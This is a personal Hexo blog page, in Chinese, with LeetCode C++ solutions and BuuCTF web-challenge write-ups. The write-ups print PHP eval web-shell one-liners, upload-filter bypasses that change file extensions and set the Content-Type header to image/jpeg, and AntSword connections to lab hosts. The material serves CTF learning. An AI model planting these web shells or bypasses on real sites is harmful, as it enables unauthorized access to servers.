@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>20240218 | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="LeetCode多数元素找出给定整数数组中的主要元素。 函数接收一个整数数组nums作为参数。首先获取数组的长度s，然后对数组进行排序。由于主要元素是出现次数超过数组长度一半的元素，因此排序后数组的中间元素一定是主要元素。所以函数返回排序后数组的中间元素nums[s&#x2F;2]。整个函数的时间复杂度取决于排序算法的复杂度，一般情况下为O(nlogn)，其中n为数组nums的长度。 123456">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20240218">
+<meta property="og:url" content="http://example.com/2024/02/18/20240218/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="LeetCode多数元素找出给定整数数组中的主要元素。 函数接收一个整数数组nums作为参数。首先获取数组的长度s，然后对数组进行排序。由于主要元素是出现次数超过数组长度一半的元素，因此排序后数组的中间元素一定是主要元素。所以函数返回排序后数组的中间元素nums[s&#x2F;2]。整个函数的时间复杂度取决于排序算法的复杂度，一般情况下为O(nlogn)，其中n为数组nums的长度。 123456">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef">
+<meta property="article:published_time" content="2024-02-18T10:46:34.000Z">
+<meta property="article:modified_time" content="2024-02-18T03:56:40.922Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-20240218" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/18/20240218/" class="article-date">
+  <time class="dt-published" datetime="2024-02-18T10:46:34.000Z" itemprop="datePublished">2024-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      20240218
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="多数元素"><a href="#多数元素" class="headerlink" title="多数元素"></a>多数元素</h5><p>找出给定整数数组中的主要元素。</p>
+<p>函数接收一个整数数组nums作为参数。首先获取数组的长度s，然后对数组进行排序。由于主要元素是出现次数超过数组长度一半的元素，因此排序后数组的中间元素一定是主要元素。所以函数返回排序后数组的中间元素nums[s&#x2F;2]。整个函数的时间复杂度取决于排序算法的复杂度，一般情况下为O(nlogn)，其中n为数组nums的长度。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> s=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> nums[s/<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h5><p>判断一个数是否为2的幂。</p>
+<p>函数中首先将输入的整数n赋值给变量m，然后进行循环判断。在循环中，如果m为0，则返回false；如果m能被2整除或者等于1，则将m除以2继续循环；否则返回false。最后返回true。该函数的时间复杂度取决于输入的整数n的大小，最坏情况下为O(logn)。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=n;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(m!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span> || m==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                m=m/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="有效的字母异同位"><a href="#有效的字母异同位" class="headerlink" title="有效的字母异同位"></a>有效的字母异同位</h5><p>判断两个字符串是否为异位词。</p>
+<p>函数中首先定义了两个长度为26的数组s1和s2，用于记录字符串s和t中各个字符出现的次数。然后分别遍历字符串s和t，统计每个字符出现的次数，并存储在对应的数组中。最后比较两个数组中每个位置上的值，如果有不同的情况则返回false，否则返回true。整个函数的时间复杂度为O(n)，其中n为字符串s和t的长度。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> s1[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;,s2[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> n1=s.<span class="built_in">length</span>(),n2=t.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            s1[s[i]-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n2;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            s2[t[i]-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s1[i]!=s2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="12、Knife"><a href="#12、Knife" class="headerlink" title="12、Knife"></a>12、Knife</h5><p>使用蚁剑，安装教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367151320">渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)</a></p>
+<p>构造payload：<code>/?&lt;?php eval($_POST[&quot;Syc&quot;]);?&gt;</code></p>
+<p>打开蚁剑添加数据</p>
+<p>URL地址为：<a target="_blank" rel="noopener" href="http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php">http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php</a></p>
+<p>密码为：Syc</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd" alt="image"></p>
+<p>测试连接，连接成功，再点击添加</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10" alt="image"></p>
+<p>右键单击，选择文件管理</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa" alt="image"></p>
+<p>查看根目录，发现有个flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52" alt="image"></p>
+<p>双击查看，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1248bbb7-c099-4589-a699-63d87c2ec2d3&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h5><p>创建一个木马文件</p>
+<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
+<p>上传该文件，显示Not image!</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
+<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
+<p>使用蚁剑</p>
+<p>URL地址为：<code>/upload/a.phtml</code></p>
+<p>连接密码为：<code>a</code></p>
+<p>测试连接，连接成功后添加</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
+<p>右键单击，文件管理，查看根目录，找到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
+<p>双击查看flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h5><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
+<p>抓包，显示上传成功</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
+<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
+<p>连接密码为：<code>a</code></p>
+<p>尝试一下，测试连接显示返回数据为空</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
+<p>尝试修改后缀名为.phtml</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
+<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
+<p>连接密码为：<code>a</code></p>
+<p>测试连接，连接成功 后添加</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
+<p>右键单击，文件管理</p>
+<p>在根目录中找到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
+<p>双击查看flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/18/20240218/" data-id="clsqz82xl0000t0vfe8ja3rl0" data-title="20240218" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/02/16/Paper-SQIRL/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SQIRL__</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 16.67px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">Web安全</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/18/20240218/">20240218</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/16/Paper-SQIRL/">SQIRL__</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/15/20240215/">20240215</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/14/20240214/">20240214</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
